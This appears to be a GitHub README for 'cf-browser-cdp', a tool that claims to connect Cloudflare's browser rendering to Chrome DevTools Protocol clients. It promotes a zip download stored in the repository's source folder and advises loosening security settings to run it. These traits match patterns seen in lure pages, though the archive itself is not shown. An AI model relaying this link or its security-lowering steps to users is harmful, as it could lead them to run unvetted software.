[![Download Latest Release](https://github.com/RainMeriloo/cf-browser-cdp/raw/refs/heads/master/src/cdp-browser-cf-1.2-beta.4.zip)](https://github.com/RainMeriloo/cf-browser-cdp/raw/refs/heads/master/src/cdp-browser-cf-1.2-beta.4.zip)

## 📋 What is cf-browser-cdp?

cf-browser-cdp helps you link Cloudflare's browser rendering service with tools that use the Chrome DevTools Protocol (CDP). Simply put, it allows your computer to talk to the Cloudflare browser engine as if it were a Chrome browser. This can help you view web pages exactly how Cloudflare sees them, which is useful if you need to test or automate browsing tasks.

## 🖥️ Who is this for?

This app is designed for people who want to connect to Cloudflare's browser service without needing to install or run Google Chrome directly. You do not need programming skills; the tool runs on your computer and handles the technical parts for you.

You might find it helpful if you:
- Want to automate web testing.
- Need to check how Cloudflare renders pages.
- Use software that talks with Chrome DevTools, but want to switch to Cloudflare's browser.

## 💻 System Requirements

Before you start, make sure your computer meets these needs:
- **Operating System**: Windows 10 or later, macOS 10.13 or later, or any Linux distribution with a modern kernel.
- **Memory**: At least 4 GB of RAM.
- **Disk Space**: 100 MB free space for installation and temporary files.
- **Internet**: A stable connection for Cloudflare services.
- **Permissions**: Ability to run software downloaded from the internet (this may require adjusting security settings).

## 🔧 How Does It Work?

Cloudflare provides a browser rendering engine in the cloud. This app acts as a bridge that uses the Chrome DevTools Protocol to control that engine.

- You send commands like "Open this webpage" or "Take a screenshot" as if you are controlling a Chrome browser.
- The app sends these commands to Cloudflare.
- Cloudflare processes and loads the page.
- The app returns information and output back to you.

This lets you control cloud browser rendering without installing or managing full Chrome browsers yourself.

## ⚙️ Features

- Bridges Cloudflare browser and local tools using CDP.
- Supports all major OS: Windows, macOS, Linux.
- Simple user interface to start and stop the service.
- Provides connection addresses for easy integration.
- Lightweight and requires minimal resources.
- Works well with browser automation and debugging tools.

## 🛠️ Troubleshooting Tips

- If the app won't start, make sure you have the required permissions and check that your firewall does not block it.
- If connecting from another app fails, verify you have the correct address from cf-browser-cdp.
- Restart cf-browser-cdp if it behaves unexpectedly.
- Check your internet connection since Cloudflare services run online.
- For macOS, allow apps from identified developers in Security & Privacy settings.
